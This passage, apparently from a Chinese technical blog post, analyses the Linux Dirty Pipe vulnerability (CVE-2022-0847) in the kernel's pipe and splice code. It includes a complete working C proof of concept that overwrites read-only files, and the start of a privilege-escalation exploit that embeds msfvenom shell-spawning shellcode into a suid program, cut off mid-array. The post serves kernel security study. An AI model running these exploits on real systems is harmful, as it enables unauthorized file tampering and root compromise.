可以进行写入</strong>；而当我们从管道中读出数据之后，纵使一个 buffer 对应的 page 上的数据被读完了，我们也不会释放该 page，而可以也会直接投入到下一次使用中，<strong>因此会保留 PIPE_BUF_FLAG_CAN_MERGE 标志位</strong></p><h2 id="splice：文件与管道间数据拷贝">splice：文件与管道间数据拷贝</h2><p>当我们想要将一个文件的数据拷贝到另一个文件时，比较朴素的一种想法是打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，<strong>具有可观的开销</strong></p><p>因此为了减少这样的开销， <code>splice</code>这一个非常独特的系统调用应运而生，其作用是<strong>在文件与管道之间进行数据拷贝</strong>，以此<strong>将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销</strong></p><p>glibc 中的 wrapper 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE         <span class="hljs-comment">/* See feature_test_macros(7) */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_in, <span class="hljs-type">loff_t</span> *off_in, <span class="hljs-type">int</span> fd_out,</span><br><span class="hljs-params">               <span class="hljs-type">loff_t</span> *off_out, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>;<br></code></pre></td></tr></table></figure><p>splice 系统调用<strong>本质上是利用管道在内核空间中进行数据拷贝</strong>，毫无疑问的是，管道是一个十分好用的内核缓冲区，于是 splice 系统调用选择使用管道作为中间的数据缓冲区</p><p>当你想要将数据从一个文件描述符拷贝到另一个文件描述符中，只需要先创建一个管道，之后使用 splice 系统调用将数据从源文件描述符拷贝到管道中、再使用 splice 系统调用将数据从管道中拷贝到目的文件描述符即可。这样的设计使得我们只需要两次系统调用便能完成数据在不同文件描述符间的拷贝工作，且<strong>数据的拷贝都在内核空间中完成，极大地减少了开销</strong></p><p>splice 系统调用正式操作前都是一些基础的检查工作，这一块不深入分析，存在如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">SYS_splice</span>()<span class="hljs-comment">// 检查文件描述符是否可用</span><br><span class="hljs-built_in">__do_splice</span>()<span class="hljs-comment">// 检查是否入设置了偏移或出设置了偏移（任一则返回）</span><br><span class="hljs-built_in">do_splice</span>()<span class="hljs-comment">// 分流</span><br></code></pre></td></tr></table></figure><p>最终文件与管道间的分流发生在 <code>do_splice()</code> 函数：</p><ul><li>从管道读取到管道，调用 <code>splice_pipe_to_pipe()</code></li><li>从文件读取到管道，调用 <code>splice_file_to_pipe()</code></li><li>从管道读取到文件，调用 <code>do_splice_from()</code></li></ul><h3 id="从文件读取到管道">从文件读取到管道</h3><p>从文件读取数据到管道的核心原理是：<strong>将 pipe_buffer 对应的 page 设置为文件映射的 page</strong></p><p>存在如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">splice_file_to_pipe</span>()</span><br><span class="hljs-function"><span class="hljs-title">do_splice_to</span>()</span><br></code></pre></td></tr></table></figure><p>在 <code>do_splice_to</code> 中最终会调用到内核文件结构体函数表的 <code>splice_read</code> 指针，对于不同的文件系统而言该函数指针不同，以 ext4 文件系统为例，查表 <code>ext4_file_operations</code>，对应调用的函数应为 <code>generic_file_splice_read</code>，存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">generic_file_splice_read()<br>    call_read_iter()<br></code></pre></td></tr></table></figure><p>该函数是文件函数表中 <code>read_iter()</code> 的 wrapper，对 ext4 而言对应调用 <code>ext4_file_read_iter</code>，源码比较多，这里只贴出核心调用链，最终调用到核心函数是 <code>filemap_read()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">ext4_file_read_iter()<br>    generic_file_read_iter()<br>    filemap_read()<br>    filemap_get_pages()<span class="hljs-comment">// 获取到文件对应映射的页面集</span><br>    copy_page_to_iter()<span class="hljs-comment">// 进行页面拷贝（单位为单个页面）</span><br>    __copy_page_to_iter()<br>    copy_page_to_iter_pipe()<span class="hljs-comment">// 我们是管道，所以走入该分支</span><br></code></pre></td></tr></table></figure><p>最终在 <code>copy_page_to_iter_pipe()</code> 中，将对应的 <code>pipe_buffer-&gt;page</code> 设为<strong>文件映射的页面集的对应页框</strong>，将页框引用计数 + 1（<code>get_page()</code>），这样就完成了一个<strong>从文件读取数据到管道的过程</strong>，因为是直接建立页面的映射，所以每次操作后都会将 head +1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br><span class="hljs-type">size_t</span> off;<br><br><span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>bytes = i-&gt;count;<br><br><span class="hljs-keyword">if</span> (unlikely(!bytes))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!sanity(i))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>off = i-&gt;iov_offset;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br><span class="hljs-keyword">if</span> (off) &#123;<br><span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br><span class="hljs-comment">/* merge with the last one */</span><br>buf-&gt;len += bytes;<br>i-&gt;iov_offset += bytes;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>i_head++;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>get_page(page);<br>buf-&gt;page = page;<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br><br>pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>i-&gt;iov_offset = offset + bytes;<br>i-&gt;head = i_head;<br>out:<br>i-&gt;count -= bytes;<br><span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们注意到——该操作<strong>缺失了对 pipe_buffer-&gt;flags 的重新赋值操作</strong></p><h3 id="从管道读取到文件">从管道读取到文件</h3><p><code>do_splice_from</code> 最终会调用对应内核文件结构的函数表中的 <code>splice_write()</code> 指针，将 pipe_buffer 数组对应页面上内容读出，写入到文件中，对于不同的文件系统而言该函数指针不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from pipe to file.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_from</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-keyword">struct</span> file *out,</span><br><span class="hljs-params">   <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (unlikely(!out-&gt;f_op-&gt;splice_write))<br><span class="hljs-keyword">return</span> warn_unsupported(out, <span class="hljs-string">&quot;write&quot;</span>);<br><span class="hljs-keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>以 ext4 文件系统为例，最终会调用到 <code>iter_file_splice_write</code> 函数，之后存在如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">iter_file_splice_write</span>(）<br>splice_from_pipe_next()<span class="hljs-comment">// 检查管道可用性</span><br><span class="hljs-built_in">vfs_iter_write</span>()<span class="hljs-comment">// 读出管道数据写入文件</span><br><span class="hljs-built_in">do_iter_write</span>()<br><span class="hljs-built_in">do_iter_readv_writev</span>()<br>call_write_iter <span class="hljs-comment">// 上层传入type为 WRITE，走入该分支</span><br></code></pre></td></tr></table></figure><p><code>call_write_iter</code> 是文件函数表中 <code>write_iter()</code> 的 wrapper，对 ext4 而言对应调用 <code>ext4_file_write_iter</code>，这里最终只是常规的将 buf 上数据拷贝到文件上的操作，也并非本篇的重点，就不展开分析了</p><h1>0x01.漏洞分析</h1><p>我们咋一看好像并没有什么问题，但让我们思考这样一个情景：</p><ul><li>我们将管道整个读写了一轮，此时所有的 pipe_buffer 都保留了 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</li><li>我们利用 splice 将数据从文件读取一个字节到管道上，此时 pipe_buffer 对应的 page 成员<strong>指向文件映射的页面</strong>，但在 splice 中<strong>并未清空 pipe_buffer 的标志位，从而让内核误以为该页面可以被写入</strong></li><li>在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而<strong>将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</li></ul><p>漏洞点便是在于 splice 系统调用中<strong>未清空</strong> <code>pipe_buffer</code> <strong>的标志位，从而将管道页面可写入的状态保留了下来</strong>，这给了我们越权写入只读文件的操作</p><p>我们不难发现这个漏洞与脏牛十分类似，都是能越权对文件进行写入，不同的是脏牛需要去撞条件竞争的概率，而该漏洞<strong>可以稳定触发</strong>，但是脏牛可以直接写整个文件，而<strong>该漏洞不能在管道边界上写入</strong></p><blockquote><p>当然，如果这个文件甚至都是不可读的，那自然是没法利用的（笑），但在主流 Linux 发行版中有着大量的可作为我们攻击目标的文件，例如 suid 程序或 <code>/etc/passwd</code> 等</p></blockquote><h1>0x02.漏洞利用</h1><p>漏洞利用的步骤其实我们在前面都已经叙述得差不多了，主要就是分三步走：</p><h2 id="Step-I-写、读管道，设置-PIPE-BUF-FLAG-CAN-MERGE-flag">Step.I 写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag</h2><p>为了保证利用能够稳定成功，我们首先新建一个管道，<strong>将管道写满后再将所有数据读出</strong>，这样管道的每一个 <code>pipe_buffer</code> 都会被设置上  <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</p><h2 id="Step-II-splice-建立-pipe-buffer-与文件的关联（漏洞产生点）">Step.II splice 建立 pipe_buffer 与文件的关联（漏洞产生点）</h2><p>接下来我们使用 splice 系统调用将数据从目标文件中读入到管道，从而让 <code>pipe_buffer-&gt;page</code> 变为文件在内存中映射的页面，为了让下一次写入数据时写回文件映射的页面，我们应当<strong>读入不多于一个数据的页面</strong>，这里笔者选择读入 1 个字节，这样我们仍能向文件上写入将近一张页面的数据</p><p>当我们完成读入之后，管道的 head 指向下一个 pipe_buffer，因此我们若要写入文件则应当走入到 pipe_write 开头写入上一个 pipe_buffer 的分支，这也是为什么我们在这里只读入一个字节的缘故</p><h2 id="Step-III-向管道中写入恶意数据，完成越权写入文件">Step.III 向管道中写入恶意数据，完成越权写入文件</h2><p>接下来<strong>我们直接向管道中写入数据就能完成对只读文件的越权写入</strong>。在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而<strong>将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</p><h2 id="poc">poc</h2><p>我们使用 qemu 起一个测试环境，看看是否能够利用该漏洞对只读文件进行写入，最终的 poc 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * POC of CVE-2022-0847</span><br><span class="hljs-comment"> * written by arttnba3</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br><span class="hljs-type">long</span>page_size;<br><span class="hljs-type">size_t</span>offset_in_file;<br><span class="hljs-type">size_t</span> data_size;<br><span class="hljs-type">int</span> target_file_fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">target_file_stat</span>;</span><br><span class="hljs-type">int</span>pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> pipe_size;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">int</span> retval;<br><br><span class="hljs-comment">// checking before we start to exploit</span><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">4</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Usage: ./exp target_file offset_in_file data&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br>page_size = sysconf(_SC_PAGE_SIZE);<br>offset_in_file = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (offset_in_file % page_size == <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Cannot write on the boundary of a page!&quot;</span>);<br><br>target_file_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br><span class="hljs-keyword">if</span> (target_file_fd &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Failed to open the target file!&quot;</span>);<br><br><span class="hljs-keyword">if</span> (fstat(target_file_fd, &amp;target_file_stat))<br>errExit(<span class="hljs-string">&quot;Failed to get the info of the target file!&quot;</span>);<br><br><span class="hljs-keyword">if</span> (offset_in_file &gt; target_file_stat.st_size)<br>errExit(<span class="hljs-string">&quot;Offset is not in the file!&quot;</span>);<br><br>data_size = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">3</span>]);<br><span class="hljs-keyword">if</span> ((offset_in_file + data_size) &gt; target_file_stat.st_size)<br>errExit(<span class="hljs-string">&quot;Cannot enlarge the file!&quot;</span>);<br><br><span class="hljs-keyword">if</span> (((offset_in_file % page_size) + data_size) &gt; page_size)<br>errExit(<span class="hljs-string">&quot;Cannot write accross a page!&quot;</span>);<br><br><span class="hljs-comment">// exploit now...</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span><br><span class="hljs-comment"> * Just write and read through</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);<br>pipe(pipe_fd);<br>pipe_size = fcntl(pipe_fd[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>buffer = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(page_size);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;<br>size_left -= write(pipe_fd[<span class="hljs-number">1</span>], buffer, per_write);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> size_left = pipe_size; size_left &gt; <span class="hljs-number">0</span>; )<br>&#123;<br><span class="hljs-type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;<br>size_left -= read(pipe_fd[<span class="hljs-number">0</span>], buffer, per_read);<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Use the splice to make the pipe_buffer-&gt;page</span><br><span class="hljs-comment"> * become the page of the file mapped, by read</span><br><span class="hljs-comment"> * a byte from the file accross the splice</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);<br>offset_in_file--;<span class="hljs-comment">// we read a byte, so offset should minus 1</span><br>retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;splice failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval == <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;short splice!&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Now it comes to the time of exploit:</span><br><span class="hljs-comment"> * the mapped page of file has been in pipe_buffer,</span><br><span class="hljs-comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span><br><span class="hljs-comment"> * just a simple write can make the exploit.</span><br><span class="hljs-comment"> */</span><br>retval = write(pipe_fd[<span class="hljs-number">1</span>], argv[<span class="hljs-number">3</span>], data_size);<br><span class="hljs-keyword">if</span> (retval &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Write failed!&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retval &lt; data_size)<br>errExit(<span class="hljs-string">&quot;Short write!&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>运行，发现我们成功地覆写了只读文件</p><p><img src="https://s2.loli.net/2022/03/12/vOGZw2Qt9VRsYDd.png" alt="image.png"></p><h1>0x03.提权</h1><p>漏洞的利用形式与“脏牛”基本上是一样的：覆写 <code>/etc/passwd</code> 或者覆写一些 suid 程序进行提权，这里就不过多赘叙了</p><h2 id="suid-提权">suid 提权</h2><p>笔者现给出一个修改指定 suid 程序进行提权的 exp，使用 msfvenom 生成运行 <code>/bin/sh</code> 的 shellcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * exploit of CVE-2022-0847</span><br><span class="hljs-comment"> * written by arttnba3</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = &#123;<br>    <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span 